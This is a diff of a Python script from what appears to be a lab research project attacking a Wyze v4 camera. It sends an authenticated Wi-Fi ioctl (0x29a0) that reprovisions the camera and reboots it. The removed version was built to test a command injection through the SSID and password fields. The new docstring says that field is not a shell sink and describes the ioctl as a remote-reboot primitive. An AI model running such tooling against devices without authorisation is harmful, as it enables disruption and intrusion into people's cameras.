@@ -1,67 +1,53 @@
 #!/usr/bin/env python3
-"""Send a vendor IOCTRL (HL v0x25) to a Wyze v4 and print the reply.
+"""Send a Wyze v4 Wi-Fi ioctl (0x29a0 = set ssid/pwd) through the fss-tutk session probe.
 
-Used to drive 0x29a0 (set wifi ssid/pwd) for the unquoted-shell injection in
-iCamera: sprintf(buf, "/tmp/connect_ap.sh %s %s", ssid, pwd); system(buf).
+Why a wrapper: the Rust `session_probe` example is the maintained TUTK client (correct DTLS
+psk-identity handling, K-auth retransmit, clean close); the ad-hoc Python client in
+`deliverables/scripts/dtlslib.py` still completes the handshake but its K-auth retry cadence is
+rejected by fw 4.52.17.26. So drive the Rust example.
 
-Usage: wyze_ssid_inject.py <ip> <cfg.json> <ssid> <pwd> [cmd_hex]
+0x29a0 takes JSON `{"ssid":..,"pwd":..}`; both are parsed, length-checked `<32` / `<64`, echoed
+back in the `0x29a1` reply as `{"ssid":..,"result":1}`, applied to the wpa config and then the unit
+reboots and returns on its previous SSID. It is a LAN Wi-Fi re-provision and a clean remote-reboot
+primitive; it is NOT a shell sink (see docs/exploit/wifi-ssid-inject.md).
+
+Usage:
+  wyze_wifi_ioctl.py <ip> <cfg.json> <ssid> <pwd> [cmd_hex]
+
+cfg.json is the lab tuple from ~/fss-exploit/cfg/<ip>.json (uid/enr/mac). Set IFACE to override the
+source address (default 192.168.4.222).
 """
 import json
-import struct
+import os
+import subprocess
 import sys
-import time
+import tempfile
 
-sys.path.insert(0, "/Users/jemanuel/projects/franken_surveillance_system/deliverables/scripts")
-import dtlslib as d
-
-
-def build_hl25(cmd, payload):
-    return b"HL\x25\x00" + struct.pack("<H", cmd) + struct.pack("<H", len(payload)) + b"\x00" * 8 + payload
+REPO = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+EXE = os.path.join(REPO, "target/debug/examples/session_probe")
 
 
 def main():
+    if len(sys.argv) < 5:
+        print(__doc__)
+        return 2
     ip, cfgp, ssid, pwd = sys.argv[1:5]
-    cmd = int(sys.argv[5], 16) if len(sys.argv) > 5 else 0x29A0
+    cmd = sys.argv[5] if len(sys.argv) > 5 else "0x29a0"
+    if len(ssid.encode()) >= 32 or len(pwd.encode()) >= 64:
+        print("ssid must be <32 bytes and pwd <64 bytes")
+        return 2
     cfg = json.load(open(cfgp))
-    cam = d.Cam2(ip, cfg["mac"], cfg["uid"], cfg["enr"], iface=cfg.get("bind_ip", "192.168.4.160"),
-                 port=cfg.get("camera_port", 32761))
-    if not cam.login():
-        print("LOGIN FAILED"); return 1
-    print("logged in")
-    body = json.dumps({"ssid": ssid, "pwd": pwd}).encode()
-    print("payload:", body)
-    avseq = cam.avseq + 1
-    cam.avseq = avseq
-    cam.send(cam.encrypt(23, d.build_ioctrl(avseq, cam.sub, build_hl25(cmd, body))))
-    cam.sub = (cam.sub + 1) & 0xFFFF
-    want = cmd + 1
-    end = time.time() + 8
-    while time.time() < end:
-        q = cam.recv_dtls(1.0)
-        if not q:
-            continue
-        if q[0] != 23:
-            continue
-        try:
-            data = cam.decrypt(23, int.from_bytes(q[5:11], "big"), q[13:13 + int.from_bytes(q[11:13], "big")])
-        except Exception:
-            continue
-        off = 0
-        while off + 2 <= len(data):
-            if data[off:off + 2] == b"HL":
-                ln = struct.unpack("<H", data[off + 6:off + 8])[0]
-                c = struct.unpack("<H", data[off + 4:off + 6])[0]
-                pl = data[off + 16:off + 16 + ln]
-                cam._ack_ioctrl(c, pl)
-                print("reply cmd %#06x len %d payload %s" % (c, len(pl), pl[:80].hex()))
-                if c == want:
-                    print("OK")
-                    return 0
-                off += 16 + ln
-            else:
-                off += 1
-    print("no matching reply")
-    return 2
+
+    with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as fh:
+        json.dump({"ssid": ssid, "pwd": pwd}, fh)
+        payload = fh.name
+
+    args = [EXE, "--ip", ip, "--uid", cfg["uid"], "--enr", cfg["enr"], "--mac", cfg["mac"],
+            "--ioctl", cmd, "--payload-file", payload, "--secs", os.environ.get("SECS", "4")]
+    if not os.path.exists(EXE):
+        args = ["cargo", "run", "-q", "-p", "fss-tutk", "--example", "session_probe", "--"] + args[1:]
+    print("payload:", json.load(open(payload)))
+    return subprocess.call(args, cwd=REPO)
 
 
 if __name__ == "__main__":
